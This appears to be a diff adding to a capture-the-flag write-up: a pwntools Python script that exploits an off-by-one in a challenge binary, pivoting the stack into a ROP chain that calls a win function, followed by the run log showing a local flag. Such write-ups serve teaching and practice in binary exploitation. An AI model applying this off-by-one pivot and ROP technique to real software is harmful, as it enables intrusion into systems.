@@ -106,4 +106,69 @@ undefined8 FUN_00401419(void)
 }
 ```
 
-**
+*Off by one in there everything aligns perfectly to abuse it let's write exploit..*
+
+
+```
+#!/usr/bin/python3
+import sys
+from pwn import *
+
+bin = "./chall"
+context.binary = elf = ELF(bin, checksec=False)
+
+WIN     = 0x401268
+REPORT  = elf.symbols.get('FUN_0040139a', 0x40139a)
+TAG     = elf.symbols.get('FUN_00401348', 0x401348)
+
+if len(sys.argv) == 3:
+    ip, port = sys.argv[1], int(sys.argv[2])
+    p = remote(ip, port)
+else:
+    p = process(elf.path)
+
+rop = ROP(elf)
+rop.call(WIN, [0xdeadbeef, 0xcafebabe])
+chain = rop.chain()
+log.info(rop.dump())
+
+p.recvuntil(b'allocated at: ')
+report_buf = int(p.recvline().strip(), 16)
+log.info(f"report buffer @ {hex(report_buf)}")
+
+low_byte = report_buf & 0xff
+if low_byte >= 0xb0:
+    log.warning("leak's low byte too high, pivot math may carry across a boundary - retry")
+
+p.recvuntil(b'Enter report summary: ')
+payload1 = b'J' * 8 + chain
+payload1 = payload1.ljust(0x50, b'\x00')
+p.send(payload1)
+
+p.recvuntil(b'Tagging operator: ')
+payload2 = b'B' * 32 + p8(low_byte)
+p.send(payload2)
+
+p.interactive()
+```
+
+**running the exploit..**
+
+```
+skid@TheGreen:~/ctfs/old/pwn/public$ python3 e.py
+[+] Starting local process '/home/skid/ctfs/old/pwn/public/chall': pid 1319
+[*] Loaded 7 cached gadgets for './chall'
+[*] 0x0000:         0x40124f pop rsi; ret
+    0x0008:       0xcafebabe [arg1] rsi = 3405691582
+    0x0010:         0x40124d pop rdi; ret
+    0x0018:       0xdeadbeef [arg0] rdi = 3735928559
+    0x0020:         0x401268
+[*] report buffer @ 0x7fffff823240
+[*] Switching to interactive mode
+[*] Process '/home/skid/ctfs/old/pwn/public/chall' stopped with exit code 0 (pid 1319)
+[*] Processing report...
+[+] Access Granted! Here is your flag:
+CSSCTF{flag-local-flag}
+[*] Got EOF while reading in interactive
+$
+```
